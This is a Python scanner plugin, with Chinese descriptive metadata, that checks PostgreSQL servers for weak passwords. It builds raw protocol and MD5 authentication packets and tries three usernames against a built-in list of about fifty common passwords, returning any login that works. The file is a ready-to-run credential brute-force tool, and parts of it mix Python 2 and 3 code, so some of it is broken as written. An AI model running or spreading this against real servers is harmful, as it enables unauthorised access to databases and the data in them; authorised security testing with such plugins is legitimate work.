#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import socket
import hashlib


def get_plugin_info():
    plugin_info = {
        "name": "PostgreSQL 弱口令",
        "desc": "导致敏感信息泄露，严重情况可导致服务器被入侵控制。",
        "grade": "高",
        "type": "service",
        "keyword": "service:PostgreSQL port:5432",
    }
    return plugin_info

def make_response(username, password, salt):
    pu = hashlib.md5(password + username).hexdigest()
    buf = hashlib.md5(pu + salt).hexdigest()
    return 'md5' + buf


def auth(host, port, username, password, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        packet_length = len(username) + 7 + len(
            "\x03user  database postgres application_name psql client_encoding UTF8  ")
        p = "%c%c%c%c%c\x03%c%cuser%c%s%cdatabase%cpostgres%capplication_name%cpsql%cclient_encoding%cUTF8%c%c" % (
        0, 0, 0, packet_length, 0, 0, 0, 0, username, 0, 0, 0, 0, 0, 0, 0, 0)
        sock.send(p)
        packet = sock.recv(1024)
        if packet[0] == b'R':
            authentication_type = str([packet[8]])
            c = int(authentication_type[4:6], 16)
            if c == 5: salt = packet[9:]
        else:
            return 3
        lmd5 = make_response(username, password, salt)
        packet_length1 = len(lmd5) + 5 + len('p')
        pp = 'p%c%c%c%c%s%c' % (0, 0, 0, packet_length1 - 1, lmd5, 0)
        sock.send(pp)
        packet1 = sock.recv(1024)
        if packet1[0] == b"R":
            return True
    except Exception as e:
        if "Errno 10061" in str(e) or "timed out" in str(e): return 3


def poc(arg):
    check_port = lambda x:x if re.match(r"(.*?):(\d+)$",x) else x+':5432'
    host,port = check_port(arg).split(':')
    timeout = 5
    user_list = ['postgres', 'admin', 'root']
    passwd_list = ["123456","admin","root","password","123123","123","1","{user}","{user}{user}","{user}1","{user}123","{user}2016","{user}2015","{user}!","","password01!","root@dba","P@ssw0rd!!","qwa123","root#123","12345678","test","123qwe!@#","123456789","123321","1314520","666666","woaini","fuckyou","000000","1234567890","8888888","qwerty","1qaz2wsx","abc123","abc123456","1q2w3e4r","123qwe","159357","p@ssw0rd","p@55w0rd","password!","p@ssw0rd!","password1","123qwe!@#","123QWE!@#","!@#qwe123","123qwe!@#$","1qaz@WSX","r00t","tomcat","apache","system"]
    error_i=0
    for user in user_list:
        for pass_ in passwd_list:
            passwd = pass_.replace('{user}', user)
            result = auth(host, int(port), user, passwd, timeout)
            if result == 3:
                error_i+=1
            if result == True: 
                return f'{arg}\t{user}/{passwd}'
            if error_i >= 3:return

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} IP[:port]".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  
